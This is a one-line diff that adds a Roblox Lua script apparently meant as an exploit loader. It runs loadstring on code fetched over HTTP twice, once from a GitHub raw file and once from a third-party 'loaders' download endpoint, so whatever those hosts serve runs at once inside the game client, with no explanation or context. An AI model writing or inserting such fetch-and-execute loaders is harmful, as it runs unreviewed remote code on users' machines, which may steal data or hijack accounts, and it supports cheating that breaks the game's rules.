@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/insomniascripts/lua/refs/heads/main/Bddies"))() task.wait(0.5) loadstring(game:HttpGet("https://api.jnkie.com/api/v1/loaders/public/a61034bb1569318e64cd035ad2f7d9520687c9c7b1177b164aabbf874deaa9d0/download"))()
